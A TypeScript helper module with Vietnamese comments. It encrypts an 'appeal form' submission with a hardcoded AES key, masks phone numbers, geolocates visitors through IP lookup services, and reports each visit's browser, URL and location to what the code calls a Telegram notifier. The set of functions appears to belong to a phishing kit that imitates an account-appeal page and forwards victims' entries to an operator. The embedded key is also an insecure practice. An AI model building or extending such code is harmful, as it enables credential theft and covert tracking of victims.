import axios from "axios";
import CryptoJS from "crypto-js";
const secretKey = "HDNDT-JDHT8FNEK-JJHR";
const STORAGE_EXPIRY = 60 * 60 * 1000; // 1 giờ

export const encrypt = (text: string) => {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
};

export const decrypt = (cipherText: string) => {
    const bytes = CryptoJS.AES.decrypt(cipherText, secretKey);
    return bytes.toString(CryptoJS.enc.Utf8);
};

export const saveRecord = (key: string, value: any) => {
    try {
        const encryptedValue = encrypt(JSON.stringify(value));
        const record = {
            value: encryptedValue,
            expiry: Date.now() + STORAGE_EXPIRY
        };
        localStorage.setItem(key, JSON.stringify(record));
    } catch (error) {
        console.error("Lỗi khi lưu localStorage:", error);
    }
};

export const getRecord = (key: string) => {
    try {
        const item = localStorage.getItem(key);
        if (!item) return null;

        const { value, expiry } = JSON.parse(item);

        // Hết hạn
        if (Date.now() > expiry) {
            localStorage.removeItem(key);
            return null;
        }

        const decryptedValue = decrypt(value);
        if (!decryptedValue) return null;

        return JSON.parse(decryptedValue);
    } catch (error) {
        console.error("Lỗi khi đọc localStorage:", error);
        return null;
    }
};

export const sendAppealForm = async (values: any) => {
    try {
        const jsonString = JSON.stringify(values);
        const encryptedData = encrypt(jsonString);

        const response = await axios.post('/api/send-request', {
            data: encryptedData,
        });

        return response;
    } catch (error) {
        throw error;
    }
};

export const maskPhoneNumber = (phone: string) => {
    if (phone) {
        if (phone.length < 5) return phone; 
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        const masked = '*'.repeat(phone.length - 4);
        return `+${start} ${masked} ${end}`;
    }
    return '';
};

export const getUserIp = async () => {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        throw error;
    }
};

// APIP
export const getUserLocation = async () => {
    try {
        const response = await axios.get(`https://apip.cc/json`);
        return {
            location: `${response.data.query || response.data.ip} | ${response.data.RegionName}(${response.data.RegionCode}) | ${response.data.CountryName}(${response.data.CountryCode})`,
            country_code: response.data.CountryCode,
            ip: response.data.query || response.data.ip,
        }

    } catch (error) {
        throw error;
    }
};

// IP WHO
// export const getUserLocation = async () => {
//     try {
//         const response = await axios.get(`https://ipwho.is`);
//         return {
//             location: `${response.data.ip} | ${response.data.region}(${response.data.region_code}) | ${response.data.country}(${response.data.country_code})`,
//             country_code: response.data.country_code,
//             ip: response.data.ip,
//         }

//     } catch (error) {
//         throw error;
//     }
// };


export const notifyTelegramVisit = async (userInfo: any) => {
    try {
        const visitData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href,
            ...userInfo
        };

        const response = await axios.post('/api/notification', {
            data: visitData,
        });

        return response;
    } catch (error) {
        console.error('Error notifying Telegram about visit:', error);
        // Don't throw error to avoid breaking the main flow
    }
};